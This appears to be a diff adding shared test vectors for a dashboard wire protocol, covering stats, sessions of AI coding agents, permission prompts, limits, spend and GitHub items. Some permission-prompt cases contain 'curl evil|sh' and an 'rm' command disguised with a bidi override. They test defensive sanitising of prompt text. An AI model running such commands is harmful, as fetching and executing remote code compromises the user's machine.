@@ -1,0 +1,313 @@
+# Dashboard wire vectors, read by the C# (shared/Edgepad.Core.Tests/DashWireTests.cs), Kotlin and Swift suites. One line per case:
+#
+#     CODEC arguments => expected
+#
+# Lines starting with # and blank lines are ignored. The line is cut at the FIRST " => ". Everything after "CODEC " up to
+# that is the arguments; everything after it is the expected text, compared exactly.
+#
+# Escapes, in the arguments and in the expected text alike (a UTF-8 file; any other character stands for itself):
+#     \t  tab        \n  line feed        \\  one backslash
+#     \u{HEX}  the code point HEX (1 to 6 hex digits)
+#     \{N*c}   N copies of the one code point c (so a 4097-byte case does not need 4097 characters in the file)
+# Markers: "<empty>" as a whole field or a whole expected text is the empty string; "<none>" as the expected text means the
+# input is rejected (a single record did not parse). A list is never rejected as a whole: an entry that does not parse or
+# is not allowed is dropped, so a list with none left is "<empty>".
+# Fields of an entry are separated by " @ ", entries by " ;; ". Only the last field of PERMASK may itself contain " @ ".
+#
+# Codecs (encoders take records, the "*PARSE" codecs take wire text and expect the canonical wire text it re-encodes to):
+#   CLEAN n text              Clean(text, n): control characters (Cc), space, "|", "/", ":", bidi and zero-width characters
+#                             (every code point in Unicode categories Cf, Zl, Zp: e.g. U+200B-200F, U+202A-202E, U+2066-2069,
+#                             U+FEFF, U+061C, U+180E, U+2028, U+2029, U+2060-2064, U+E0000-E007F) become a space; runs collapse; trim; cut to n
+#                             code points (never inside a surrogate pair); trim again.
+#   CLEANTEXT text            CleanText(text): keeps \n and \t; shows every other control character (Cc: U+0000-001F and
+#                             U+007F-009F, so \r and U+0085 too) and the bidi and zero-width characters above as <U+XXXX>
+#                             (upper-case hex, at least 4 digits). Nothing is deleted. No trim, no cut. Idempotent.
+#   STATS c,r,g,v,d,u,p,l,ct,gt,gp          eleven integers; percents (cpu ram gpu vram loss) clamp to 0..100, any negative is -1;
+#                             the rest: negative is -1.
+#   STATSINFO cpu ;; ramMiB ;; gpu ;; vramMiB ;; net      names Clean(30), shrunk together until the payload fits 255 bytes; a
+#                             negative MiB is -1. STATSINFOPARSE needs exactly five "|" fields and integers.
+#   DISKS label @ usedPct @ totalGiB @ freeGiB ;; ...     label Clean(16), empty becomes "-"; used clamps 0..100 (negative -1);
+#                             total and free negative -1; at most 6 entries; trailing entries dropped until 255 bytes.
+#   SESSIONS agent @ state @ ctx @ title ;; ...           agent claude|codex|gemini|opencode, state busy|wait|idle (else dropped);
+#                             ctx is how full the session's context window is, 0..100, anything else is -1; title Clean(24); at
+#                             most 8; trailing entries dropped until 255 bytes. SESSIONSPARSE drops an entry whose ctx is not an
+#                             integer or that has not exactly 4 ":" fields (the title is the last and holds no ":").
+#   PERMANSWER wire           => "allow ID" | "deny ID" | <none>. Exactly 12 lowercase hex, "/", then "a" or "d", nothing else.
+#   PERMLABEL id flag         => "id/flag"; PERMLABELPARSE wire => "id flag" | <none>.
+#   PERMASK agent @ tool @ text   => "F body". F is 1 when complete: nothing was cut on the way (the laptop's own flag; these
+#                             vectors are all uncut), "agent\ntool\n" plus the RAW text fits 4096 bytes, AND the cleaned body
+#                             fits 4096 bytes. Otherwise F is 0 and the text is empty. tool: every char outside A-Za-z0-9_.-
+#                             becomes "_", cut to 24, empty becomes "unknown". body is agent, tool and CleanText(text) joined by
+#                             line feeds. The "\{N*c}" cases after "\{2043*é}" repeat a literal U+0001 (a file line cannot hold
+#                             a literal U+0085, which some readers take as a line break).
+#   PERMASKPARSE body         => "agent @ tool @ text" | <none>. Agent known, tool 1..24 of A-Za-z0-9_.-, body <= 4096 bytes.
+#   LIMITS agent @ window @ pct @ resetAtMin @ measuredAtMin ;; ...   window: canonical decimal 1..525600, "ctx", or "~" and a
+#                             name (Clean(16), not empty); anything else drops the entry. pct (a decimal) clamps 0..100 and
+#                             rounds half up. A negative time is -1. Trailing entries dropped until 255 bytes.
+#   SPEND agent @ measuredAtMin @ tokToday @ centsToday @ tok7d @ cents7d @ tok30d @ cents30d @ unpriced ;; ...
+#                             64-bit integers; 7d and 30d are the last 7 and 30 local days, today counted; nothing longer is
+#                             sent. measuredAtMin negative is -1, the rest negative is 0. unpriced is 1 (some tokens had no
+#                             price: the cents are a lower bound) or 0; SPENDPARSE drops an entry whose flag is anything else or
+#                             that has not exactly 9 fields. Trailing entries dropped to 255.
+#   WEATHER tempTenthsC @ wmoCode @ city   temp clamps -999..999, a wmo outside 0..99 is -1, city Clean(24). "WEATHER none" is
+#                             the empty payload.
+#   GITHUB section @ repo @ number @ title @ flags @ ci ;; ...   section R|M|N (else dropped). For R and M the repo must be
+#                             owner/name (each 1..100 of A-Za-z0-9_.-), number >= 0, title Clean(80), flags "d" or nothing,
+#                             ci ok|fail|pending|none (anything else is none). An N line is always "N", empty, the count,
+#                             empty, empty, "none". At most 10 lines per section; trailing lines dropped until 8192 bytes.
+#                             Lines are joined by line feeds, fields by tabs.
+
+# ---- CLEAN
+CLEAN 11 hello world => hello world
+CLEAN 10 hello world => hello worl
+CLEAN 10 \u{20}\u{20}a\u{20}\u{20}b\u{20} => a b
+CLEAN 30 a|b/c:d => a b c d
+CLEAN 30 tab\there\nnl => tab here nl
+CLEAN 5 abcdefgh => abcde
+CLEAN 5 ab\u{20}\u{20}\u{20}\u{20}cd => ab cd
+CLEAN 3 ab cd => ab
+CLEAN 3 a\u{1F600}\u{1F600}\u{1F600} => a\u{1F600}\u{1F600}
+CLEAN 4 \{6*😀} => \{4*😀}
+CLEAN 30 a\u{202E}b => a b
+CLEAN 30 \u{0}x\u{7F}y\u{85}z => x y z
+CLEAN 30 \u{20}| => <empty>
+CLEAN 0 abc => <empty>
+CLEAN 30 caf\u{E9} \u{65E5}\u{672C} => café 日本
+
+# ---- CLEANTEXT
+CLEANTEXT line1\nline2\ttab => line1\nline2\ttab
+CLEANTEXT a\u{0}b\u{7}c\u{D}\u{A}d => a<U+0000>b<U+0007>c<U+000D>\nd
+CLEANTEXT \u{1F}\u{7F}\u{9F}\u{9}\u{A0} => <U+001F><U+007F><U+009F>\t\u{A0}
+CLEANTEXT \u{1B}[31mred => <U+001B>[31mred
+CLEANTEXT a<U+0085>b => a<U+0085>b
+CLEANTEXT x\u{202E}y => x<U+202E>y
+CLEANTEXT \u{200B}\u{FEFF}\u{2066} => <U+200B><U+FEFF><U+2066>
+CLEANTEXT \u{200F}\u{2069}\u{202A} => <U+200F><U+2069><U+202A>
+CLEANTEXT a\u{061C}b\u{2028}c\u{2029}d => a<U+061C>b<U+2028>c<U+2029>d
+CLEANTEXT x\u{2060}\u{2064}\u{180E}y => x<U+2060><U+2064><U+180E>y
+CLEANTEXT t\u{E0041}\u{E007F}g => t<U+E0041><U+E007F>g
+CLEANTEXT \u{85} => <U+0085>
+CLEANTEXT café 日本 => café 日本
+CLEANTEXT \u{20}\u{20}keep\u{20}\u{20} => \u{20}\u{20}keep\u{20}\u{20}
+
+# ---- STATS
+STATS 12,48,-1,-1,1200,340,9,0,55,-1,-1 => 12/48/-1/-1/1200/340/9/0/55/-1/-1
+STATS 101,200,-5,100,-1,-7,0,150,-3,90,12 => 100/100/-1/100/-1/-1/0/100/-1/90/12
+STATS -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1 => -1/-1/-1/-1/-1/-1/-1/-1/-1/-1/-1
+STATS 0,0,0,0,2147483647,0,0,0,0,0,0 => 0/0/0/0/2147483647/0/0/0/0/0/0
+STATSPARSE 12/48/-1/-1/1200/340/9/0/55/-1/-1 => 12/48/-1/-1/1200/340/9/0/55/-1/-1
+STATSPARSE 101/2/3/4/5/6/7/8/9/10/11 => 100/2/3/4/5/6/7/8/9/10/11
+STATSPARSE 1/2/3 => <none>
+STATSPARSE 1/2/3/4/5/6/7/8/9/10/x => <none>
+STATSPARSE 1/2/3/4/5/6/7/8/9/10/11/12 => <none>
+STATSPARSE <empty> => <none>
+
+# ---- STATSINFO
+STATSINFO Ryzen 5 5600 ;; 16384 ;; RTX 3060 ;; 12288 ;; Intel Wi-Fi => Ryzen 5 5600|16384|RTX 3060|12288|Intel Wi-Fi
+STATSINFO a|b ;; -1 ;; c/d ;; -1 ;; e:f => a b|-1|c d|-1|e f
+STATSINFO cpu ;; -5 ;; gpu ;; 0 ;; net => cpu|-1|gpu|0|net
+STATSINFO \u{20} ;; 1 ;; \u{20} ;; 2 ;; \u{20} => |1||2|
+STATSINFO \{40*x} ;; 1 ;; \{40*y} ;; 2 ;; \{40*z} => \{30*x}|1|\{30*y}|2|\{30*z}
+STATSINFO \{30*😀} ;; 1 ;; \{30*😀} ;; 2 ;; \{30*😀} => \{20*😀}|1|\{20*😀}|2|\{20*😀}
+STATSINFOPARSE Ryzen 5|16384|RTX 3060|12288|Wi-Fi => Ryzen 5|16384|RTX 3060|12288|Wi-Fi
+STATSINFOPARSE a|1|b|2 => <none>
+STATSINFOPARSE a|x|b|2|c => <none>
+STATSINFOPARSE a|1|b|2|c|d => <none>
+
+# ---- DISKS
+DISKS C @ 70 @ 476 @ 143 ;; D @ 10 @ 931 @ 838 => C:70:476:143|D:10:931:838
+DISKS Data/Backup:1 @ 101 @ -1 @ 5 => Data Backup 1:100:-1:5
+DISKS \u{20} @ 5 @ 6 @ 7 => -:5:6:7
+DISKS A @ -3 @ -4 @ -5 => A:-1:-1:-1
+DISKS <empty> => <empty>
+DISKS A @ 1 @ 2 @ 3 ;; B @ 1 @ 2 @ 3 ;; C @ 1 @ 2 @ 3 ;; D @ 1 @ 2 @ 3 ;; E @ 1 @ 2 @ 3 ;; F @ 1 @ 2 @ 3 ;; G @ 1 @ 2 @ 3 => A:1:2:3|B:1:2:3|C:1:2:3|D:1:2:3|E:1:2:3|F:1:2:3
+DISKS \{20*😀} @ 10 @ 100 @ 100 ;; \{20*😀} @ 10 @ 100 @ 100 ;; \{20*😀} @ 10 @ 100 @ 100 ;; \{20*😀} @ 10 @ 100 @ 100 ;; \{20*😀} @ 10 @ 100 @ 100 => \{16*😀}:10:100:100|\{16*😀}:10:100:100|\{16*😀}:10:100:100
+DISKSPARSE C:70:476:143|D:10:931:838 => C:70:476:143|D:10:931:838
+DISKSPARSE C:150:476:143 => C:100:476:143
+DISKSPARSE C:70:476 => <empty>
+DISKSPARSE C:x:1:2|D:1:2:3 => D:1:2:3
+DISKSPARSE <empty> => <empty>
+# ---- SESSIONS
+SESSIONS claude @ busy @ 42 @ Fix login => claude:busy:42:Fix login
+SESSIONS codex @ wait @ -1 @ a|b:c/d => codex:wait:-1:a b c d
+SESSIONS grok @ busy @ 0 @ x ;; claude @ nap @ 0 @ y ;; claude @ idle @ 100 @ ok => claude:idle:100:ok
+SESSIONS claude @ idle @ 101 @ over => claude:idle:-1:over
+SESSIONS claude @ idle @ -7 @ under => claude:idle:-1:under
+SESSIONS claude @ idle @ -1 @ \u{20} => claude:idle:-1:
+SESSIONS claude @ busy @ 0 @ \{30*x} => claude:busy:0:\{24*x}
+SESSIONS <empty> => <empty>
+SESSIONS claude @ idle @ -1 @ s1 ;; claude @ idle @ -1 @ s2 ;; claude @ idle @ -1 @ s3 ;; claude @ idle @ -1 @ s4 ;; claude @ idle @ -1 @ s5 ;; claude @ idle @ -1 @ s6 ;; claude @ idle @ -1 @ s7 ;; claude @ idle @ -1 @ s8 ;; claude @ idle @ -1 @ s9 ;; claude @ idle @ -1 @ s10 => claude:idle:-1:s1|claude:idle:-1:s2|claude:idle:-1:s3|claude:idle:-1:s4|claude:idle:-1:s5|claude:idle:-1:s6|claude:idle:-1:s7|claude:idle:-1:s8
+SESSIONS claude @ busy @ -1 @ \{30*😀} ;; codex @ wait @ -1 @ \{30*😀} ;; claude @ idle @ -1 @ \{30*😀} ;; claude @ idle @ -1 @ \{30*😀} => claude:busy:-1:\{24*😀}|codex:wait:-1:\{24*😀}
+SESSIONSPARSE claude:busy:42:Fix login|codex:wait:-1:Refactor => claude:busy:42:Fix login|codex:wait:-1:Refactor
+SESSIONSPARSE claude:busy => <empty>
+SESSIONSPARSE claude:busy:Fix login => <empty>
+SESSIONSPARSE claude:busy:x:y => <empty>
+SESSIONSPARSE claude:busy:150:y => claude:busy:-1:y
+SESSIONSPARSE grok:busy:0:x|codex:idle:5:y => codex:idle:5:y
+
+# ---- PERMANSWER and PERMLABEL
+PERMANSWER a1b2c3d4e5f6/a => allow a1b2c3d4e5f6
+PERMANSWER 0123456789ab/d => deny 0123456789ab
+PERMANSWER A1B2C3D4E5F6/a => <none>
+PERMANSWER a1b2c3d4e5f6/A => <none>
+PERMANSWER a1b2c3d4e5f6/D => <none>
+PERMANSWER a1b2c3d4e5f6/a\u{20} => <none>
+PERMANSWER \u{20}a1b2c3d4e5f6/a => <none>
+PERMANSWER a1b2c3d4e5f6/a\n => <none>
+PERMANSWER a1b2c3d4e5/a => <none>
+PERMANSWER a1b2c3d4e5f67/a => <none>
+PERMANSWER g1b2c3d4e5f6/a => <none>
+PERMANSWER a1b2c3d4e5f6/x => <none>
+PERMANSWER a1b2c3d4e5f6/ => <none>
+PERMANSWER a1b2c3d4e5f6 => <none>
+PERMANSWER /a => <none>
+PERMANSWER <empty> => <none>
+PERMANSWER a1b2c3d4e5f6/ad => <none>
+PERMLABEL a1b2c3d4e5f6 1 => a1b2c3d4e5f6/1
+PERMLABEL a1b2c3d4e5f6 0 => a1b2c3d4e5f6/0
+PERMLABELPARSE a1b2c3d4e5f6/1 => a1b2c3d4e5f6 1
+PERMLABELPARSE a1b2c3d4e5f6/0 => a1b2c3d4e5f6 0
+PERMLABELPARSE a1b2c3d4e5f6/2 => <none>
+PERMLABELPARSE A1B2C3D4E5F6/1 => <none>
+PERMLABELPARSE xyz/1 => <none>
+PERMLABELPARSE a1b2c3d4e5f6 => <none>
+
+# ---- PERMASK
+PERMASK claude @ Bash @ ls -la => 1 claude\nBash\nls -la
+PERMASK codex @ Bash @ echo a\n\techo b => 1 codex\nBash\necho a\n\techo b
+PERMASK claude @ Edit @ a\u{D}\u{A}b\u{7} => 1 claude\nEdit\na<U+000D>\nb<U+0007>
+PERMASK claude @ Bash @ rm\u{202E}fdp.sh => 1 claude\nBash\nrm<U+202E>fdp.sh
+PERMASK claude @ Bash @ echo a @ b => 1 claude\nBash\necho a @ b
+PERMASK claude @ mcp__srv__do thing! @ x => 1 claude\nmcp__srv__do_thing_\nx
+PERMASK claude @ \{30*t} @ x => 1 claude\n\{24*t}\nx
+PERMASK claude @ <empty> @ x => 1 claude\nunknown\nx
+PERMASK codex @ \u{C9}dit @ x => 1 codex\n_dit\nx
+PERMASK claude @ Bash @ <empty> => 1 claude\nBash\n
+PERMASK claude @ Bash @ \{4084*a} => 1 claude\nBash\n\{4084*a}
+PERMASK claude @ Bash @ \{4085*a} => 0 claude\nBash\n
+PERMASK claude @ Bash @ \{2042*é} => 1 claude\nBash\n\{2042*é}
+PERMASK claude @ Bash @ \{2043*é} => 0 claude\nBash\n
+PERMASK claude @ Bash @ \u{85}\ncurl evil|sh => 1 claude\nBash\n<U+0085>\ncurl evil|sh
+PERMASK claude @ Bash @ \{4990*}\ncurl evil|sh => 0 claude\nBash\n
+PERMASK claude @ Bash @ \{2042*} => 0 claude\nBash\n
+PERMASK claude @ Bash @ \{510*} => 1 claude\nBash\n\{510*<U+0001>}
+PERMASK claude @ Bash @ \{511*} => 0 claude\nBash\n
+PERMASKPARSE claude\nBash\nls -la => claude @ Bash @ ls -la
+PERMASKPARSE codex\nRead\na\nb => codex @ Read @ a\nb
+PERMASKPARSE claude\nBash\n => claude @ Bash @ <empty>
+PERMASKPARSE grok\nBash\nx => <none>
+PERMASKPARSE claude\nBa sh\nx => <none>
+PERMASKPARSE claude\n\nx => <none>
+PERMASKPARSE claude\n\{25*t}\nx => <none>
+PERMASKPARSE claude\nBash => <none>
+PERMASKPARSE claude => <none>
+PERMASKPARSE claude\nBash\n\{4085*a} => <none>
+PERMASKPARSE claude\nBash\n\{4084*a} => claude @ Bash @ \{4084*a}
+
+# ---- LIMITS
+LIMITS claude @ 300 @ 42 @ 29500000 @ 29499900 => claude:300:42:29500000:29499900
+LIMITS claude @ 10080 @ 7.5 @ -1 @ -1 => claude:10080:8:-1:-1
+LIMITS codex @ 43200 @ 12.0 @ 29600000 @ 29499900 => codex:43200:12:29600000:29499900
+LIMITS claude @ ctx @ 15 @ -1 @ 29499900 => claude:ctx:15:-1:29499900
+LIMITS codex @ ~spend_limit @ 80 @ -1 @ -1 => codex:~spend_limit:80:-1:-1
+LIMITS claude @ 300 @ 140 @ 5 @ 6 => claude:300:100:5:6
+LIMITS claude @ 300 @ -3 @ 5 @ 6 => claude:300:0:5:6
+LIMITS claude @ 300 @ 99.5 @ 5 @ 6 => claude:300:100:5:6
+LIMITS claude @ 300 @ 0.4 @ 5 @ 6 => claude:300:0:5:6
+LIMITS claude @ 300 @ 1 @ -50 @ -2 => claude:300:1:-1:-1
+LIMITS claude @ 1 @ 1 @ 1 @ 1 => claude:1:1:1:1
+LIMITS claude @ 525600 @ 1 @ 1 @ 1 => claude:525600:1:1:1
+LIMITS claude @ 525601 @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ 0 @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ 600000 @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ 5h @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ -5 @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ 0300 @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ 3.5 @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ ~ @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ ~\u{20}| @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ CTX @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ <empty> @ 1 @ 1 @ 1 => <empty>
+LIMITS grok @ 300 @ 1 @ 1 @ 1 => <empty>
+LIMITS claude @ ~a|b/c @ 1 @ 1 @ 1 => claude:~a b c:1:1:1
+LIMITS claude @ ~\{20*n} @ 1 @ 1 @ 1 => claude:~\{16*n}:1:1:1
+LIMITS claude @ 0 @ 1 @ 1 @ 1 ;; claude @ 5h @ 1 @ 1 @ 1 ;; claude @ 1 @ 1 @ 1 @ 1 => claude:1:1:1:1
+LIMITS <empty> => <empty>
+LIMITS codex @ ~\{16*😀} @ 80 @ -1 @ -1 ;; codex @ ~\{16*😀} @ 80 @ -1 @ -1 ;; codex @ ~\{16*😀} @ 80 @ -1 @ -1 ;; codex @ ~\{16*😀} @ 80 @ -1 @ -1 ;; codex @ ~\{16*😀} @ 80 @ -1 @ -1 => codex:~\{16*😀}:80:-1:-1|codex:~\{16*😀}:80:-1:-1|codex:~\{16*😀}:80:-1:-1
+LIMITSPARSE claude:300:42:29500000:29499900|claude:ctx:15:-1:29499900 => claude:300:42:29500000:29499900|claude:ctx:15:-1:29499900
+LIMITSPARSE codex:~spend_limit:80:-1:-1 => codex:~spend_limit:80:-1:-1
+LIMITSPARSE claude:300:150:1:1 => claude:300:100:1:1
+LIMITSPARSE claude:5h:1:1:1 => <empty>
+LIMITSPARSE claude:300:1:1 => <empty>
+LIMITSPARSE claude:300:x:1:1 => <empty>
+LIMITSPARSE grok:300:1:1:1|codex:300:2:3:4 => codex:300:2:3:4
+
+# ---- SPEND
+SPEND claude @ 29499900 @ 120000 @ 310 @ 800000 @ 2100 @ 3000000 @ 9000 @ 0 => claude/29499900/120000/310/800000/2100/3000000/9000/0
+SPEND codex @ -4 @ -1 @ -2 @ 5 @ 0 @ 7 @ -9 @ 1 => codex/-1/0/0/5/0/7/0/1
+SPEND gemini @ 5 @ 0 @ 0 @ 0 @ 0 @ 0 @ 0 @ 0 => gemini/5/0/0/0/0/0/0/0
+SPEND claude @ 1 @ 9999999999 @ 1 @ 1 @ 1 @ 1 @ 1 @ 0 => claude/1/9999999999/1/1/1/1/1/0
+SPEND grok @ 1 @ 1 @ 1 @ 1 @ 1 @ 1 @ 1 @ 0 => <empty>
+SPEND <empty> => <empty>
+SPEND claude @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 1 ;; codex @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 9223372036854775807 @ 1 => claude/9223372036854775807/9223372036854775807/9223372036854775807/9223372036854775807/9223372036854775807/9223372036854775807/9223372036854775807/1
+SPENDPARSE claude/29499900/120000/310/800000/2100/3000000/9000/0|codex/1/2/3/4/5/6/7/1 => claude/29499900/120000/310/800000/2100/3000000/9000/0|codex/1/2/3/4/5/6/7/1
+SPENDPARSE claude/1/2/3 => <empty>
+SPENDPARSE claude/1/2/3/4/5/6/7/8/9/0 => <empty>
+SPENDPARSE claude/1/x/3/4/5/6/7/0 => <empty>
+SPENDPARSE grok/1/2/3/4/5/6/7/0 => <empty>
+SPENDPARSE claude/1/2/3/4/5/6/7 => <empty>
+SPENDPARSE claude/1/2/3/4/5/6/7/2 => <empty>
+SPENDPARSE claude/1/2/3/4/5/6/7/1/0 => <empty>
+SPENDPARSE claude/1/2/3/4/5/6/7/x|codex/1/2/3/4/5/6/7/1 => codex/1/2/3/4/5/6/7/1
+
+# ---- WEATHER
+WEATHER 185 @ 3 @ Oslo => 185/3/Oslo
+WEATHER -52 @ 71 @ Troms\u{F8} => -52/71/Tromsø
+WEATHER 0 @ 0 @ St/Louis: MO => 0/0/St Louis MO
+WEATHER 100 @ 120 @ X => 100/-1/X
+WEATHER 100 @ -4 @ X => 100/-1/X
+WEATHER 100 @ 99 @ X => 100/99/X
+WEATHER 5000 @ 1 @ X => 999/1/X
+WEATHER -5000 @ 1 @ X => -999/1/X
+WEATHER 1 @ 1 @ \{30*c} => 1/1/\{24*c}
+WEATHER 1 @ 1 @ <empty> => 1/1/
+WEATHER none => <empty>
+WEATHERPARSE 185/3/Oslo => 185/3/Oslo
+WEATHERPARSE 1/1/a/b => 1/1/a b
+WEATHERPARSE 1/1/ => 1/1/
+WEATHERPARSE 5000/120/X => 999/-1/X
+WEATHERPARSE 185/3 => <none>
+WEATHERPARSE x/3/Oslo => <none>
+WEATHERPARSE 1/x/Oslo => <none>
+WEATHERPARSE <empty> => <none>
+
+# ---- GITHUB
+GITHUB R @ octo/cat @ 12 @ Fix the thing @ <empty> @ ok => R\tocto/cat\t12\tFix the thing\t\tok
+GITHUB M @ octo/cat @ 7 @ WIP @ d @ pending => M\tocto/cat\t7\tWIP\td\tpending
+GITHUB N @ <empty> @ 5 @ <empty> @ <empty> @ <empty> => N\t\t5\t\t\tnone
+GITHUB N @ a/b @ 3 @ ignored @ d @ ok => N\t\t3\t\t\tnone
+GITHUB R @ a/b @ 1 @ t @ <empty> @ weird => R\ta/b\t1\tt\t\tnone
+GITHUB R @ a/b @ 1 @ t @ x @ ok => R\ta/b\t1\tt\t\tok
+GITHUB R @ a/b @ 1 @ t @ xd @ fail => R\ta/b\t1\tt\t\tfail
+GITHUB R @ a/b @ 1 @ fix: a|b/c\there @ <empty> @ ok => R\ta/b\t1\tfix a b c here\t\tok
+GITHUB R @ a/b @ 1 @ \{100*t} @ <empty> @ ok => R\ta/b\t1\t\{80*t}\t\tok
+GITHUB R @ a/b @ 1 @ <empty> @ <empty> @ none => R\ta/b\t1\t\t\tnone
+GITHUB R @ my.org-x/re_po.js @ 0 @ t @ <empty> @ ok => R\tmy.org-x/re_po.js\t0\tt\t\tok
+GITHUB R @ no slash @ 1 @ t @ <empty> @ ok => <empty>
+GITHUB R @ a/b/c @ 1 @ t @ <empty> @ ok => <empty>
+GITHUB R @ a/b\tc @ 1 @ t @ <empty> @ ok => <empty>
+GITHUB R @ a/ @ 1 @ t @ <empty> @ ok => <empty>
+GITHUB R @ <empty> @ 1 @ t @ <empty> @ ok => <empty>
+GITHUB R @ \{101*a}/b @ 1 @ t @ <empty> @ ok => <empty>
+GITHUB X @ a/b @ 1 @ t @ <empty> @ ok => <empty>
+GITHUB R @ a/b @ -1 @ t @ <empty> @ ok => <empty>
+GITHUB <empty> => <empty>
+GITHUB R @ a/b @ 1 @ one @ <empty> @ ok ;; R @ a/b @ 2 @ two @ d @ fail ;; N @ <empty> @ 4 @ <empty> @ <empty> @ <empty> => R\ta/b\t1\tone\t\tok\nR\ta/b\t2\ttwo\td\tfail\nN\t\t4\t\t\tnone
+GITHUB R @ a/b @ 1 @ t @ <empty> @ ok ;; R @ a/b @ 2 @ t @ <empty> @ ok ;; R @ a/b @ 3 @ t @ <empty> @ ok ;; R @ a/b @ 4 @ t @ <empty> @ ok ;; R @ a/b @ 5 @ t @ <empty> @ ok ;; R @ a/b @ 6 @ t @ <empty> @ ok ;; R @ a/b @ 7 @ t @ <empty> @ ok ;; R @ a/b @ 8 @ t @ <empty> @ ok ;; R @ a/b @ 9 @ t @ <empty> @ ok ;; R @ a/b @ 10 @ t @ <empty> @ ok ;; R @ a/b @ 11 @ t @ <empty> @ ok ;; M @ a/b @ 12 @ t @ <empty> @ ok => R\ta/b\t1\tt\t\tok\nR\ta/b\t2\tt\t\tok\nR\ta/b\t3\tt\t\tok\nR\ta/b\t4\tt\t\tok\nR\ta/b\t5\tt\t\tok\nR\ta/b\t6\tt\t\tok\nR\ta/b\t7\tt\t\tok\nR\ta/b\t8\tt\t\tok\nR\ta/b\t9\tt\t\tok\nR\ta/b\t10\tt\t\tok\nM\ta/b\t12\tt\t\tok
+GITHUBPARSE R\tocto/cat\t12\tFix the thing\t\tok => R\tocto/cat\t12\tFix the thing\t\tok
+GITHUBPARSE N\t\t5\t\t\tnone\nR\ta/b\t2\tx\td\tfail => N\t\t5\t\t\tnone\nR\ta/b\t2\tx\td\tfail
+GITHUBPARSE R\ta/b\t1\tt\t => <empty>
+GITHUBPARSE R\ta/b\t1\tt\t\tok\tx => <empty>
+GITHUBPARSE X\ta/b\t1\tt\t\tok\nM\ta/b\t2\tt\t\tok => M\ta/b\t2\tt\t\tok
+GITHUBPARSE R\ta/b\t1\tt\t\tok\n\nM\ta/b\t2\tt\t\tok => R\ta/b\t1\tt\t\tok\nM\ta/b\t2\tt\t\tok
+GITHUBPARSE <empty> => <empty>
